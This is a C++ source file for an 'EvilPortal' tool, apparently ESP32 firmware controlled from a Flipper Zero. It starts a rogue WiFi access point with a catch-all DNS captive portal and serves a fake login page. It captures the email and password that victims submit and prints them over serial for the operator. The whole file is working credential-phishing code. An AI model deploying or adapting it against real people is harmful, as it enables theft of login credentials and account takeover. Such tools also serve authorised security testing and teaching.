#include "EvilPortal.h"

AsyncWebServer server(80);

EvilPortal::EvilPortal() {
  this->runServer = false;
  this->name_received = false;
  this->password_received = false;
}

void EvilPortal::begin() {
  // wait for init flipper input
  //getInitInput();

  startPortal();
}

String EvilPortal::get_user_name() {
  return this->user_name;
}

String EvilPortal::get_password() {
  return this->password;
}

void EvilPortal::setupServer() {
  server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", this->index_html);
    Serial.println("client connected");
  });

  server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
    String inputMessage;
    String inputParam;

    if (request->hasParam("email")) {
      inputMessage = request->getParam("email")->value();
      inputParam = "email";
      this->user_name = inputMessage;
      this->name_received = true;
    }

    if (request->hasParam("password")) {
      inputMessage = request->getParam("password")->value();
      inputParam = "password";
      this->password = inputMessage;
      this->password_received = true;
    }
    request->send(
      200, "text/html",
      "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  });
  Serial.println("web server up");
}

bool EvilPortal::checkForCommand(char *command) {
  bool received = false;
  if (Serial.available() > 0) {
    String flipperMessage = Serial.readString();
    const char *serialMessage = flipperMessage.c_str();
    int compare = strncmp(serialMessage, command, strlen(command));
    if (compare == 0) {
      received = true;
    }
  }
  return received;
}

void EvilPortal::getInitInput() {
  // wait for html
  Serial.println("Waiting for HTML");
  bool has_ap = false;
  bool has_html = false;
  while (!has_html || !has_ap) {
    if (Serial.available() > 0) {
      String flipperMessage = Serial.readString();
      const char *serialMessage = flipperMessage.c_str();
      if (strncmp(serialMessage, SET_HTML_CMD, strlen(SET_HTML_CMD)) == 0) {
        serialMessage += strlen(SET_HTML_CMD);
        strncpy(this->index_html, serialMessage, strlen(serialMessage) - 1);
        has_html = true;
        Serial.println("html set");
      } else if (strncmp(serialMessage, SET_AP_CMD, strlen(SET_AP_CMD)) ==
                  0) {
        serialMessage += strlen(SET_AP_CMD);
        strncpy(this->apName, serialMessage, strlen(serialMessage) - 1);
        has_ap = true;
        Serial.println("ap set");
      } else if (strncmp(serialMessage, RESET_CMD, strlen(RESET_CMD)) == 0) {
        this->resetFunction();
      }
    }
  }
  Serial.println("all set");
}

void EvilPortal::startAP() {
  Serial.print("starting ap ");
  Serial.println(this->apName);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(this->apName);

  Serial.print("ap ip address: ");
  Serial.println(WiFi.softAPIP());

  this->setupServer();

  this->dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  server.begin();
}

void EvilPortal::startPortal() {
  // wait for flipper input to get config index
  this->startAP();

  this->runServer = true;
}

void EvilPortal::main() {
  this->dnsServer.processNextRequest();
  if (name_received && password_received) {
    this->name_received = false;
    this->password_received = false;
    String logValue1 =
        "u: " + this->user_name;
    String logValue2 = "p: " + this->password;
    Serial.println(logValue1);
    Serial.println(logValue2);
  }
  //if(this->checkForCommand(RESET_CMD)) {
  //  Serial.println("reseting");
  //  this->resetFunction();
  //}
}